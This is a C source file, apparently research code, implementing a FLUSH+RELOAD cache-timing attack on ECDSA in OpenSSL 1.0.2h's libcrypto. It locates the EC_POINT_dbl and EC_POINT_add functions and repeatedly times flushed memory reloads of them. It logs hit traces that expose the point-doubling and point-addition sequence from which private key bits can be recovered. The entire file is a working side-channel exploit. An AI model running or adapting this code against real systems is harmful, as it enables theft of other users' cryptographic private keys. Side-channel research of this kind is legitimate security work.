#define _GNU_SOURCE
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sched.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <dlfcn.h>
#include <sys/mman.h>
#include <sys/stat.h>

#include <fcntl.h>
#include <libelf.h>

#include "cache_utils.h" /*Cache manipulation functions*/
typedef void function_t();




long int get_function_address_by_name(const char* funcname)
{
    Dl_info info;
    void *libcrypto;
    function_t *target_function;
    libcrypto = dlopen("/home/zc/dev/cache_attack/openssl-1.0.2h/libcrypto.so", RTLD_NOW); // change to your own path
    target_function = dlsym(libcrypto, funcname);

    if(!dladdr((void*)target_function, &info))
    {
        printf("[x]Error loading dynamic symbols.\n");
        return 0;
    }

    long int symbol_address = (long int)info.dli_saddr;
    long int off = (long int)(info.dli_saddr - info.dli_fbase);
    printf("[*]Base address: %lx symbol address: %lx offset: %lx\n", (long int)info.dli_fbase, (long int)info.dli_saddr, off);

    dlclose(libcrypto);
    return symbol_address;
}


void printSlotBuffer(slot_t *buffer, unsigned long size, int count, unsigned char (*name)[10], int threshold)
{
    unsigned int i, j, any_hit = 0;
    for (i = 0; i < size; i++) 
    {
        for (j = 0; j < count; j++) 
        {
            
            if (buffer[i].probe_time[j] <= threshold && !any_hit) 
            {
                printf("START\n");
                any_hit = 1;
                    
            }
            printf("%s,%llu,%lu\n", name[j], buffer[i].start, buffer[i].probe_time[j]);
        }
    }
    if (any_hit) 
    {
        printf("END\n");
        fflush(stdout);
    }
}


int main(int argc, char **argv)
{
    if (argc < 2)
    {
        printf("Usage: Arguments: slot number, reload threshold\n");
        exit(1);
    }

    unsigned int slot = atoi(argv[1]);
    unsigned int threshold = atoi(argv[2]);
    printf("[*]FLUSH+RELOAD Attack on ECDSA\n");

    /*Carry the attack*/
    long int *probes[PROBE_COUNT];
    probes[0] = (long int *)get_function_address_by_name("EC_POINT_dbl");
    probes[1] = (long int *)get_function_address_by_name("EC_POINT_add");

    if(probes[0] == 0 || probes[1] == 0)
    {
        printf("[*]Error locating address\n");
        exit(1);
    }

    unsigned long quiet_length = 0;
    unsigned long hit = 0;
    slot_t buffer[SLOT_BUF_SIZE];
    unsigned long buffer_pos = 0;
    unsigned long long current_slot_start = 0;
    unsigned long long current_slot_end = 0;
    unsigned long long last_completed_slot_end = 0;
    int t1 = 0, t2 = 0;

    last_completed_slot_end = (timestamp() / slot) * slot;

	while (1) 
	{
	    mfence();

	    current_slot_start = (timestamp() / slot) * slot;
	    current_slot_end = current_slot_start + slot;
	    buffer[buffer_pos].start = current_slot_start;
	    buffer[buffer_pos].missed = (current_slot_start - last_completed_slot_end) / slot;

	    /* Stop if RDTSC ever fails to be monotonic. */
	    if (current_slot_start < last_completed_slot_end) {
	        printf("[x]Current Start: %llu. Last end: %llu\n", current_slot_start, last_completed_slot_end);
	        exit(-1);
	    }

	    t1 = access_timed_flush(probes[0]);
	    t2 = access_timed_flush(probes[1]);

	    buffer[buffer_pos].probe_time[0] = t1;
	    buffer[buffer_pos].probe_time[1] = t2;

	    if (t1 <= threshold || t2 <= threshold) 
	    {
	        hit = 1;
	    }
	    
	    /* If we got a hit, reset the quiet streak length. */
	    if (hit) {
	        quiet_length = 0;
	    } else {
	        quiet_length++;
	    }
	    /* Wait for this slot to end. */
	    while (timestamp() < current_slot_end) {
	        /* Busy wait. */
	    }
	    // reload与flush之后的等待阶段

	    /* Indicate that *this* slot has finished. */
	    last_completed_slot_end = current_slot_end;

	    /* Advance to the next time slot. */
	    buffer_pos++;

	    printf("buffer_pos: %ld quiet_length: %ld\n", buffer_pos, quiet_length);
	    /* If we've reached the end of the buffer, dump it. */
	    unsigned char name[2][10] = {"Dbl", "Add"};
	    if (buffer_pos >= SLOT_BUF_SIZE) 
	    {
	        printSlotBuffer(buffer, buffer_pos, 2, name, threshold);
	        buffer_pos = 0;
	    }

	    /* Or, if it's been quiet for a while, do it now. */
	    if (buffer_pos >= 1 && quiet_length >= MAX_QUIET_PERIOD) 
	    {
	        printSlotBuffer(buffer, buffer_pos, 2, name, threshold);
	        buffer_pos = 0;
	    } 
    } 

    return 0;
}
